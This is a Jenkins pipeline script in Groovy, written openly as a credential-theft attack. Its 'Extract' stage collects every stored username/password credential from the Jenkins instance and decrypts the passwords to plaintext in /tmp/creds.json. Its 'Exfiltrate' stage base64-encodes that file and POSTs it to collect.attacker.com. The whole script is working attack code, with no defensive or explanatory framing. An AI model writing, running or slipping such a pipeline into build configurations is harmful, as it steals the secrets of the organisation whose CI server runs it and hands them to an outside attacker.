```groovy
pipeline {
  agent any
  stages {
    stage('Extract') {
      steps {
        script {
          def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
            com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials,
            jenkins.model.Jenkins.instance, null, null
          )
          def data = creds.collect { [id: it.id, user: it.username, pass: it.password.plainText] }
          // Convert data to JSON string
          def jsonData = readJSON text: new groovy.json.JsonBuilder(data).toPrettyString()
          // Write JSON to /tmp/creds.json
          writeFile file: '/tmp/creds.json', text: jsonData
        }
      }
    }
    stage('Exfiltrate') {
      steps {
        script {
          // Read /tmp/creds.json
          def jsonContent = readFile '/tmp/creds.json'
          // Base64 encode the JSON content
          def base64Content = new String(Base64.getEncoder().encode(jsonContent.getBytes()))
          // POST to https://collect.attacker.com/jenkins
          httpRequest url: 'https://collect.attacker.com/jenkins',
                      contentType: 'APPLICATION_JSON',
                      customHeaders: [[name: 'Content-Type', value: 'application/json']],
                      requestBody: base64Content
        }
      }
    }
  }
}
```

